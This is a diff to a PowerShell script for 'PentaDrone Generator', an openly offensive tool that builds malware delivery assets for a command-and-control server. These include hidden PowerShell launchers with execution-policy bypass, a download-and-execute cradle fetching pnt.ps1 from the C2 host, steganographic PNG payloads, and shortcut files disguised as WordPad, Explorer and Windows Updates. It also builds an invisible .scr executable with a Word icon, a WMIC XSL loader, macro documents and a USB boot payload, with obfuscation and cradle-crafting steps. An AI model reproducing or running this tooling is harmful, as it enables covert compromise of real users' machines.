@@ -21,7 +21,7 @@
 
 Write-Host "PentaDrone Generator v3.0 " -ForegroundColor DarkGreen;
 Write-Host "Generate pentaDrone Agents, Offensives Assets and C2 files
- - by @thebenygreen - @eyesopensec 
+ --------- by @thebenygreen - @eyesopensec  --------- 
  
  ======================================================================
  " 
@@ -149,7 +149,7 @@ Get-Content "$ScriptDir\config.ini" | ForEach-Object -Begin {$settings=@{}} -Pro
 $md = {
 #md Output;
 md $ScriptDir\Package\hta;
-md png;
+#md png;
 md $ScriptDir\Package\exe;
 md $ScriptDir\Package\xls;
 md $ScriptDir\Package\sct;
@@ -177,6 +177,7 @@ $sleeptime2 = $settings.Get_Item("sleeptime2")
 $sleeptime3 = $settings.Get_Item("sleeptime3")
 $evilimage = $settings.Get_Item("evilimage")
 if (!$evilimage ) {$evilimage = "$ScriptDir\Build\dog.png" }
+#$evilimage = "$ScriptDir\Build\dog.png"
 $lnkicon = $settings.Get_Item("lnkicon")
 $exeicon = $settings.Get_Item("exeicon")
 if (!$exeicon ) {$exeicon = "$ScriptDir\Build\icon\wordx.ico" }
@@ -333,7 +334,6 @@ return $encoding.GetString($h,0,$h.Length);
 
 }
 Out-EncryptedScript $ScriptDir\Package\payload.ps1 $passcrypt $thatsalt
-
 #Generate and encrypt Agent DOWNLOADER file (PNT.PS1)
 (get-content $ScriptDir\Package\agent_pnt.ps1) | foreach-object {$_ -replace "GETC2URL", "$getc2" -replace "KEYTOREADGETC2", "$keyreadgetC2" -replace "ROOT_FOLDER", "$rootfolder" -replace "LINK_FOLDER", "$linkfolder" -replace "PASSCRYPT", "$passcrypt" -replace "SALT", "$thatsalt" } | set-content $ScriptDir\Package\d.ps1
 Invoke-Xencrypt -InFile $ScriptDir\Package\d.ps1 -OutFile $ScriptDir\Package\c2c\pnt.ps1 -Iterations 4
@@ -357,21 +357,24 @@ Remove-Item -path $ScriptDir\Package\brib4.txt -recurse
 Remove-Item -path $ScriptDir\Package\brib5.txt -recurse
 
 #Others files vector generation (Mitre ATT&CK) 
-Write-Host "--------------> 30 %" -ForegroundColor DarkGreen;
 
 function Out-PNG {
-$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
-Import-Module $ScriptDir\Build\stego.ps1
-echo "PowerShell -Exec Bypass -NoL -Win Hidden -Enc $enc" > .\bat\pnt.ps1
-Set-PowerStego -Method Hide -ImageSource File -ImageSourcePath $evilimage -ImageDestinationPath .\png\image.png -PayloadSource Text -PayloadPath .\bat\pnt.ps1
-Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath $c2c/$rootfolder/$linkfolder/image.png -PayloadSource Text -PayloadPath .\png\InfectWithPNG.txt
+	$stegbat = @"
+echo off
+PowerShell.exe -Exec Bypass -NoL ".\st.ps1 $enc $c2c/$rootfolder/$linkfolder/image.png"	
+"@
+add-content ./st.bat -Value $stegbat
+start ./st.bat
 }
 Out-PNG
+$ooo = Read-Host -Prompt 'Wait the second screen close and press ENTER'
 copy $ScriptDir\Build\stego.ps1 .\stego.ps1
 Write-Host "Weaponized PNG file : $evilimage" -ForegroundColor DarkGreen;
-add-content ./stego.ps1 -Value "VAR_IMAGE_URL = Read-Host -Prompt 'Use your OWN URL. Type URL of Evil image : '" 
+add-content ./stego.ps1 -Value "`n VAR_IMAGE_URL = Read-Host -Prompt 'Use your OWN URL. Type URL of Evil image : '" 
 add-content ./stego.ps1 -Value "Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath VAR_IMAGE_URL -PayloadSource Text -PayloadPath .\InfectWithPNG.txt"
+move .\stego.ps1 $ScriptDir\Package\png 
 
+Write-Host "--------------> 30 %" -ForegroundColor DarkGreen;
 $ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
 function Out-HTA {
     [CmdletBinding()] Param(
@@ -611,10 +614,10 @@ function Out-LNK {
     $Shortcut.Save()
     Write-Output "LNK file: $OutputPath"
 	}
-Out-LNK -OutputPath $pwd\Wordpad.lnk -Icon "C:\Program Files\Windows NT\Accessories\wordpad.exe,1" -Description "WordPad Document shortcut"
-Out-LNK -OutputPath $pwd\Explorer.lnk -Icon "explorer.exe,0" -Description "Windows Explorer shortcut"
-Out-LNK -OutputPath $pwd\Windows.lnk -Icon "explorer.exe,23" -Description "Windows Updates shortcut"
-Out-LNK -OutputPath $pwd\Folder.lnk -Icon "explorer.exe,13" -Description "Folder shortcut"
+Out-LNK -OutputPath $ScriptDir\Package\lnk\Wordpad.lnk -Icon "C:\Program Files\Windows NT\Accessories\wordpad.exe,1" -Description "WordPad Document shortcut"
+Out-LNK -OutputPath $ScriptDir\Package\lnk\Explorer.lnk -Icon "explorer.exe,0" -Description "Windows Explorer shortcut"
+Out-LNK -OutputPath $ScriptDir\Package\lnk\Windows.lnk -Icon "explorer.exe,23" -Description "Windows Updates shortcut"
+Out-LNK -OutputPath $ScriptDir\Package\lnk\Folder.lnk -Icon "explorer.exe,13" -Description "Folder shortcut"
 #Out-LNK -OutputPath $pwd\$lnkname -Icon "%SystemRoot%\system32\SHELL32.dll,7" -Description "Disk shortcut"
 
 Write-Host "Weaponized LNK file "
@@ -680,16 +683,6 @@ wmic os get /format:"$c2c/$rootfolder/$linkfolder/wmic.xsl"
 Out-Wmic
 Write-Host "Weaponized WMIC file "
 
-
-function Out-Obfuscate {
-	Invoke-Obfuscation -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString("$c2c/$rootfolder/$linkfolder/pnt.ps1")} -Command "$obfuscationToken $ScriptDir\Package\bat\pnt-obfuscated.bat" -Quiet
-	Write-Host "Obfuscate > \bat\pnt-obfuscated.bat"
-	cscript.exe $ScriptDir\Build\obfuscator\vbs_obfuscator.vbs $ScriptDir\Package\vbs\agent.vbs > $ScriptDir\Package\vbs\agent_obfuscated.vbs
-	}
-Out-Obfuscate
-Write-Host "Obfuscation OK " -ForegroundColor DarkGreen;
-Write-Host "--------------> 90 %" -ForegroundColor DarkGreen;
-
 function Out-Exe { 
 	$Command = @"
 $ScriptDir\Build\Ps1_To_Exe.exe /ps1 $ScriptDir\Package\c2c\pnt.ps1 /exe $ScriptDir\Package\exe\client.scr /icon $exeicon  /invisible 
@@ -704,14 +697,36 @@ set-content $ScriptDir\Package\exe\readme.txt -Value "DONT WORRY, SCR extension 
  }
 Out-Exe
 Write-Host "Executable Created " -ForegroundColor DarkGreen;
+Write-Host "--------------> 90 %" -ForegroundColor DarkGreen;
+
+$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
+<# function Out-Obfuscate {
+	cscript.exe $ScriptDir\Build\obfuscator\vbs_obfuscator.vbs $ScriptDir\Package\vbs\agent.vbs > $ScriptDir\Package\vbs\agent_obfuscated.vbs
+	Invoke-Obfuscation -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString("$c2c/$rootfolder/$linkfolder/pnt.ps1")} -Command "$obfuscationToken $ScriptDir\Package\bat\pnt-obfuscated.bat" -Quiet
+	Write-Host "Obfuscate > \bat\pnt-obfuscated.bat"
+	}
+Out-Obfuscate
+#>
+
+function Out-Obfuscate { 
+	$obfile = "$obfuscationToken $ScriptDir\Package\bat\pnt-obfuscated.bat"
+	$obfbat = @"
+echo off
+PowerShell.exe -Exec Bypass -NoL ".\obf.ps1 $c2c/$rootfolder/$linkfolder/pnt.ps1 '$obfile'"	
+"@
+add-content ./obf.bat -Value $obfbat
+start ./obf.bat
+}
+Out-Obfuscate
+$ooo = Read-Host -Prompt 'Wait the second screen close and press ENTER'
+Write-Host "Obfuscation OK " -ForegroundColor DarkGreen;
 Write-Host "--------------> 95 %" -ForegroundColor DarkGreen;
 
 echo "PowerShell -Exec Bypass -NoL -Win Hidden -Enc $enc" > $ScriptDir\Package\bat\pnt.bat
 copy $ScriptDir\Package\bat\pnt.bat $ScriptDir\Package\c2c
 copy $ScriptDir\Package\c2c\pnt-Encoded.bat $ScriptDir\Package\bat
-copy .\png\image.png $ScriptDir\Package\c2c
-#move .\pnt.SED $ScriptDir\Package\exe
-#---Debug---
+copy $ScriptDir\Package\png\image.png $ScriptDir\Package\c2c
+#---clean---
 set-content $ScriptDir\Package\payload.ps1 -Value ""
 Rename-Item $ScriptDir\Package\payload.ps1 $ScriptDir\Package\note.txt
 Remove-Item -path $ScriptDir\Package\note.txt
@@ -725,31 +740,33 @@ copy $ScriptDir\Build\template.xls $ScriptDir\Package\xls
 copy $ScriptDir\Build\template.docm $ScriptDir\Package\xls
 copy $ScriptDir\Build\template.doc $ScriptDir\Package\xls
 copy $ScriptDir\Build\MacroPack.exe $ScriptDir\Package\xls
-
-#Remove-Item -path .\autorunTemplate.inf
 Write-Host "."
 Write-Host "."
 
 $ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
-Import-Module $ScriptDir\Build\obfuscator\Invoke-CradleCrafter.psd1
-$cradle = Invoke-CradleCrafter -Url "$c2c/$rootfolder/$linkfolder/pnt.ps1" -Command 'Memory\*\All\1' -Quiet  
-set-content $ScriptDir\Package\c2c\pnt-secured-iex.ps1 -Value $cradle
+#Import-Module $ScriptDir\Build\obfuscator\Invoke-CradleCrafter.psd1
+#$cradle = Invoke-CradleCrafter -Url "$c2c/$rootfolder/$linkfolder/pnt.ps1" -Command 'Memory\*\All\1' -Quiet  
+
+function Out-CradleCrafter { 
+	$cradlbat = @"
+echo off
+PowerShell.exe -Exec Bypass -NoL ".\cradl.ps1 $c2c/$rootfolder/$linkfolder/pnt.ps1 'Memory\*\All\1'"	
+"@
+add-content ./cradl.bat -Value $cradlbat
+start ./cradl.bat
+}
+Out-CradleCrafter
 Write-Host "CradleCrafter > \c2c\pnt-secured-iex.ps1" -ForegroundColor DarkGreen;
 
 $ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
-copy "$ScriptDir\Build\*.ico" $ScriptDir\Package\ico
+copy "$ScriptDir\Build\icon\*.ico" $ScriptDir\Package\ico
 move $ScriptDir\Package\ico "$ScriptDir\Package\Client"
 move $ScriptDir\Package\bat "$ScriptDir\Package\Client"
-copy $evilimage .\png\OLD.png
-move .\stego.ps1 .\png
-move .\png "$ScriptDir\Package\Client"
+copy $evilimage $ScriptDir\Package\png\OLD.png
+move $ScriptDir\Package\png "$ScriptDir\Package\Client"
 move $ScriptDir\Package\hta "$ScriptDir\Package\Client"
 move $ScriptDir\Package\vbs "$ScriptDir\Package\Client"
-move .\Wordpad.lnk $ScriptDir\Package\lnk
-move .\Explorer.lnk $ScriptDir\Package\lnk
-move .\Windows.lnk $ScriptDir\Package\lnk
-move .\Folder.lnk $ScriptDir\Package\lnk
-copy $ScriptDir\Package\exe\client.exe $ScriptDir\Package\usb\word.exe
+copy $ScriptDir\Package\exe\client.scr $ScriptDir\Package\usb\boot.scr
 move $ScriptDir\Package\lnk "$ScriptDir\Package\Client"
 move $ScriptDir\Package\xls "$ScriptDir\Package\Client"
 move $ScriptDir\Package\js "$ScriptDir\Package\Client"
@@ -765,7 +782,6 @@ copy "$ScriptDir\Build\JSRatServer.ps1" "$ScriptDir\Package\Client"
 Write-Host "---- FINISH ------> 100 %" -ForegroundColor Yellow;
 
 Write-Host "CONTENT GENERATED IN FOLDER c2c MUST BE COPY&PASTE IN THE LINKFOLDER OF YOUR ACTUAL Server"
-
 $ooo = Read-Host -Prompt 'OK'
 }
 
@@ -814,6 +830,4 @@ Write-Host "READY ?" -ForegroundColor DarkGreen;
 $ooo = Read-Host -Prompt 'PRESS ANY KEY TO CLOSE' 
 }
 
-
-<##>
 
